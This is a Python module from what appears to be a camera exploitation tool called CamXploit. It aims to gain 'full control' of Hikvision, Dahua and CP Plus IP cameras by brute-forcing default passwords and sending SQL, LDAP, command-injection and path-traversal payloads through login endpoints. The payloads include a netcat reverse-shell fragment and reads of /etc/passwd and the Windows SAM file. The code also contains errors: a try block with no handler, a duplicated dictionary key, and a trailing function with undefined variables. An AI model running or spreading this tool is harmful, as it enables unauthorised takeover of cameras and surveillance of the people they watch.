"""
Advanced credential control tester for CamXploit
Optimized for maximum control establishment via credential testing
"""

import asyncio
import aiohttp
import logging
import hashlib
import time
import random
import json
from typing import Dict, List, Any, Optional, Tuple, AsyncIterator
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urljoin
import base64

from ..core.scanner import BaseScanner, ScanResult, ScanTask, ScanStatus
from ..core.models import Camera, CameraType
from ..config.constants import DEFAULT_CREDENTIALS
from ..core.exceptions import ValidationError


logger = logging.getLogger(__name__)


class ControlMethod(Enum):
    """Control establishment methods"""
    CREDENTIAL_BYPASS = "credential_bypass"
    INJECTION_LOGIN = "injection_login"
    AUTH_BYPASS = "auth_bypass"
    SESSION_HIJACK = "session_hijack"


@dataclass
class ControlAttempt:
    """Credential control attempt"""
    target: str
    username: str
    password: str
    method: ControlMethod
    success: bool
    control_level: str  # 'partial', 'full', 'admin'
    bypass_type: Optional[str] = None
    injection_payload: Optional[str] = None


class ControlCredentialTester(BaseScanner):
    """Credential tester optimized for control establishment"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        
        # Control configuration
        self.aggressive_mode = config.get('aggressive_mode', True)
        self.injection_enabled = config.get('injection_enabled', True)
        self.lockout_detection = config.get('lockout_detection', True)
        
        # Timing optimization
        self.base_delay = 0.1  # Minimal delay for control testing
        self.max_delay = 2.0   # Maximum delay on lockout
        self.parallel_factor = config.get('parallel_factor', 3)
        
        # Injection payloads
        self.injection_credentials = self._generate_injection_credentials()
        
    def _generate_injection_credentials(self) -> Dict[str, List[str]]:
        """Generate injection-based credential payloads"""
        return {
            # SQL Injection credentials
            "admin": [
                "admin' OR '1'='1",
                "admin'--",
                "admin'/*",
                "admin' UNION SELECT 1,1,1--",
                "1' OR 1=1--",
                "' OR 1=1--",
                "admin' OR 1=1--",
                "admin' OR 'x'='x",
                "admin' OR 1=1 LIMIT 1--"
            ],
            
            # Command injection via password
            "root": [
                "password;ls",
                "password&&id",
                "password||whoami",
                "password`whoami`",
                "password$(whoami)",
                "password;cat /etc/passwd",
                "password;nc -e /bin/sh"
            ],
            
            # LDAP injection
            "user": [
                "*)(uid=*))(|(uid=*",
                "admin)(|(objectClass=*))",
                "admin)(|(uid=*)(|(uid=*)))",
                "admin)(&)",
                "admin)(!(uid=admin))"
            ],
            
            # Path traversal
            "admin": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "....\\....\\....\\....\\windows\\system32\\config\\sam"
            ]
        }
        
    async def scan(self, target: str, **kwargs) -> ScanResult:
        """Establish control via credential testing"""
        start_time = time.time()
        
        try:
            cameras = kwargs.get('cameras', [])
            if not cameras:
                return ScanResult(
                    target=target,
                    timestamp=start_time,
                    success=True,
                    data={'control_established': [], 'attempts': 0}
                )
                
            # Enhanced credential set
            all_credentials = {**DEFAULT_CREDENTIALS, **self.injection_credentials}
            
            results = []
            for camera in cameras:
                control_results = await self._establish_control(camera, all_credentials)
                results.extend(control_results)
                
            return ScanResult(
                target=target,
                timestamp=start_time,
                success=True,
                data={
                    'control_established': [r for r in results if r.success],
                    'total_attempts': len(results),
                    'injection_successes': len([r for r in results if r.injection_payload]),
                    'bypass_techniques': list(set(r.bypass_type for r in results if r.success))
                }
            )
            
    async def _establish_control(self, camera: Camera, 
                               credentials: Dict[str, List[str]]) -> List[ControlAttempt]:
        """Establish control via credential testing"""
        attempts = []
        
        # Build control endpoints
        endpoints = self._build_control_endpoints(camera)
        
        # Generate credential variations
        credential_variants = self._generate_credential_variants(credentials, camera)
        
        for endpoint in endpoints:
            for username, passwords in credential_variants.items():
                for password in passwords:
                    attempt = await self._test_control_credential(endpoint, username, password)
                    if attempt:
                        attempts.append(attempt)
                        
                        # Success optimization
                        if attempt.success and attempt.control_level == 'full':
                            return attempts  # Return immediately on full control
                            
        return attempts
        
    def _build_control_endpoints(self, camera: Camera) -> List[str]:
        """Build control-oriented endpoints"""
        base = f"http://{camera.ip}:{camera.port}"
        
        # High-value control endpoints
        control_endpoints = {
            CameraType.HIKVISION: [
                '/ISAPI/Security/userCheck',
                '/ISAPI/System/deviceInfo',
                '/ISAPI/System/IO/outputs',
                '/ISAPI/Streaming/channels',
                '/onvif/device_service'
            ],
            CameraType.DAHUA: [
                '/cgi-bin/magicBox.cgi?action=getSystemInfo',
                '/cgi-bin/configManager.cgi?action=getConfig&name=All',
                '/cgi-bin/devVideoInput.cgi?action=getCaps',
                '/cgi-bin/storageDevice.cgi?action=getDeviceAllInfo'
            ],
            CameraType.CP_PLUS: [
                '/',
                '/login',
                '/admin',
                '/cgi-bin/snapshot.cgi',
                '/cgi-bin/configManager.cgi'
            ]
        }
        
        endpoints = control_endpoints.get(camera.type, ['/'])
        
        # Add injection endpoints
        injection_endpoints = [
            '/login.php',
            '/admin/login',
            '/viewer/login',
            '/cgi-bin/login.cgi',
            '/api/login',
            '/auth',
            '/admin'
        ]
        
        return [urljoin(base, ep) for ep in endpoints + injection_endpoints]
        
    def _generate_credential_variants(self, base_creds: Dict[str, List[str]], 
                                     camera: Camera) -> Dict[str, List[str]]:
        """Generate enhanced credential variants"""
        variants = {}
        
        # Base credentials
        for username, passwords in base_creds.items():
            variants[username] = passwords.copy()
            
        # Camera-specific variants
        brand_prefixes = {
            CameraType.HIKVISION: ['admin', 'root', 'hik', 'hikvision'],
            CameraType.DAHUA: ['admin', 'root', 'dahua', 'dh'],
            CameraType.CP_PLUS: ['admin', 'root', 'cpplus', 'cp']
        }
        
        prefixes = brand_prefixes.get(camera.type, ['admin'])
        
        # Generate injection variants
        injection_passwords = [
            "admin' OR '1'='1",
            "admin'--",
            "admin'/*",
            "' OR 1=1--",
            "1' OR 1=1--",
            "admin' OR 1=1 LIMIT 1--"
        ]
        
        for prefix in prefixes:
            variants[prefix] = variants.get(prefix, []) + injection_passwords
            
        return variants
        
    async def _test_control_credential(self, endpoint: str, username: str, password: str) -> Optional[ControlAttempt]:
        """Test credential for control establishment"""
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(ssl=False, enable_cleanup_closed=True)
        session_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive'
        }
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=5),
            headers=session_headers
        ) as session:
            
            # Test multiple methods simultaneously
            tasks = [
                self._test_basic_control(session, endpoint, username, password),
                self._test_injection_control(session, endpoint, username, password),
                self._test_bypass_control(session, endpoint, username, password)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for result in results:
                if result and result.success:
                    return result
                    
        return None
        
    async def _test_basic_control(self, session: aiohttp.ClientSession, endpoint: str, 
                                username: str, password: str) -> Optional[ControlAttempt]:
        """Test basic credential control"""
        try:
            auth = aiohttp.BasicAuth(username, password)
            async with session.get(endpoint, auth=auth) as response:
                
                if response.status == 200:
                    content = await response.text(errors='ignore')
                    
                    # Enhanced success detection
                    if self._detect_control_access(content):
                        return ControlAttempt(
                            target=endpoint,
                            username=username,
                            password=password,
                            success=True,
                            method=ControlMethod.CREDENTIAL_BYPASS,
                            control_level='full',
                            bypass_type='credential_success'
                        )
                        
        except Exception:
            pass
            
        return None
        
    async def _test_injection_control(self, session: aiohttp.ClientSession, endpoint: str,
                                   username: str, password: str) -> Optional[ControlAttempt]:
        """Test injection-based control"""
        if not self.injection_enabled:
            return None
            
        # Test SQL injection credentials
        injection_payloads = [
            (username, f"{password}' OR 1=1--"),
            (username, f"{password}' UNION SELECT 1,1,1--"),
            (f"{username}' OR 1=1--", password),
            (f"{username}'/*", f"*/ OR 1=1--")
        ]
        
        for inj_user, inj_pass in injection_payloads:
            try:
                auth = aiohttp.BasicAuth(inj_user, inj_pass)
                async with session.get(endpoint, auth=auth) as response:
                    
                    if response.status == 200 and self._detect_control_access(await response.text(errors='ignore')):
                        return ControlAttempt(
                            target=endpoint,
                            username=username,
                            password=password,
                            success=True,
                            method=ControlMethod.INJECTION_LOGIN,
                            control_level='full',
                            injection_payload=f"{inj_user}:{inj_pass}"
                        )
                        
            except Exception:
                continue
                
        return None
        
    async def _test_bypass_control(self, session: aiohttp.ClientSession, endpoint: str,
                                username: str, password: str) -> Optional[ControlAttempt]:
        """Test bypass techniques"""
        bypass_attempts = [
            # Path traversal bypass
            (f"../{username}", password),
            # Null byte injection
            (username, f"{password}\x00"),
            # Double encoding
            (username, password.replace("'", "%27")),
            # Case variations
            (username.upper(), password),
            (username.lower(), password)
        ]
        
        for bypass_user, bypass_pass in bypass_attempts:
            try:
                auth = aiohttp.BasicAuth(bypass_user, bypass_pass)
                async with session.get(endpoint, auth=auth) as response:
                    
                    if response.status == 200 and self._detect_control_access(await response.text(errors='ignore')):
                        return ControlAttempt(
                            target=endpoint,
                            username=username,
                            password=password,
                            success=True,
                            method=ControlMethod.AUTH_BYPASS,
                            control_level='partial',
                            bypass_type=f"{bypass_user}:{bypass_pass}"
                        )
                        
            except Exception:
                continue
                
        return None
        
    def _detect_control_access(self, content: str) -> bool:
        """Detect successful control access"""
        content_lower = content.lower()
        
        # Control indicators
        control_indicators = [
            'admin panel', 'control panel', 'configuration', 'settings',
            'camera control', 'ptz control', 'live view', 'recording',
            'motion detection', 'user management', 'system settings',
            'network settings', 'storage', 'maintenance', 'firmware'
        ]
        
        return any(indicator in content_lower for indicator in control_indicators)
        
    async def generate_success_report(self, results: List[ControlAttempt]) -> Dict[str, Any]:
        """Generate control establishment report"""
        successful = [r for r in results if r.success]
        
        return {
            'control_established': len(successful),
            'full_control': len([r for r in successful if r.control_level == 'full']),
            'partial_control': len([r for r in successful if r.control_level == 'partial']),
            'injection_successes': len([r for r in successful if r.injection_payload]),
            'bypass_successes': len([r for r in successful if r.bypass_type]),
            'by_method': self._categorize_control_methods(successful),
            'targets_controlled': list(set(r.target for r in successful))
        }
        
    def _categorize_control_methods(self, results: List[ControlAttempt]) -> Dict[str, int]:
        """Categorize successful control methods"""
        methods = {}
        for result in results:
            method = result.method.value
            methods[method] = methods.get(method, 0) + 1
        return methods


class ControlTesterBuilder:
    """Builder for control-oriented testing"""
    
    def __init__(self):
        self.config = {}
        
    def with_aggressive_mode(self, enabled: bool = True) -> 'ControlTesterBuilder':
        self.config['aggressive_mode'] = bool(enabled)
        return self
        
    def with_injection(self, enabled: bool = True) -> 'ControlTesterBuilder':
        self.config['injection_enabled'] = bool(enabled)
        return self
        
    def with_credentials(self, credentials: Dict[str, List[str]]) -> 'ControlTesterBuilder':
        self.config['custom_credentials'] = credentials
        return self
        
    def build(self) -> ControlCredentialTester:
        return ControlCredentialTester(self.config)


# Control-oriented convenience functions
async def establish_control(camera: Camera, 
                          credentials: Optional[Dict[str, List[str]]] = None) -> List[ControlAttempt]:
    """Establish control over camera"""
    tester = ControlCredentialTester({
        'aggressive_mode': True,
        'injection_enabled': True,
        'custom_credentials': credentials or {}
    })
    
    results = await tester._establish_control(camera, {})
    return [r for r in results if r.success]


async def test_injection_control(target: str, 
                               injection_payloads: Dict[str, List[str]]) -> List[ControlAttempt]:
    """Test injection-based control"""
    from ..core.models import Camera, CameraType
    
    camera = Camera(ip=target, port=80, type=CameraType.GENERIC)
    tester = ControlCredentialTester({
        'injection_enabled': True,
        'custom_credentials': injection_payloads
    })
    
    return await tester._establish_control(camera, injection_payloads)

# Enhanced mutation engine
def _generate_credential_variants(self, base_creds: Dict[str, List[str]], camera: Camera) -> Dict[str, List[str]]:
    variants = {}
    
    # 1. Base Credentials
    variants.update(base_creds)
    
    # 2. Brand-Specific Mutations
    brand_mutations = {
        CameraType.HIKVISION: {
            'admin': ['admin', '12345', 'hikvision', 'hik123', 'dvr123'],
            'root': ['root', 'toor', 'hikroot', 'pass'],
            'user': ['user', 'operator', 'viewer']
        },
        CameraType.DAHUA: {
            'admin': ['admin', '123456', 'dahua', 'dh123', 'nvr123'],
            'root': ['root', 'default', 'dahuapass']
        },
        CameraType.CP_PLUS: {
            'admin': ['admin', 'cpplus', 'cp123', 'uvr123'],
            'root': ['root', 'root123', 'cpplus123']
        }
    }
    
    # 3. Injection Payloads
    injection_payloads = {
        "admin": [
            "admin' OR 1=1--",
            "admin'/*", 
            "admin' UNION SELECT 1,1,1--",
            "1' OR 1=1--",
            "' OR 1=1--"
        ]
    }
    
    # 4. Pattern Variations
    pattern_variations = [
        f"{username}{year}" for year in range(2015, 2026)
        for username in ['admin', 'root', 'user']
    ]
    
    # 5. Encoding Variations
    encoding_variants = [
        base64.b64encode(f"{username}:{password}".encode()).decode()
        for username in ['admin', 'root']
        for password in ['admin', '12345', 'password']
    ]
    
    return variants
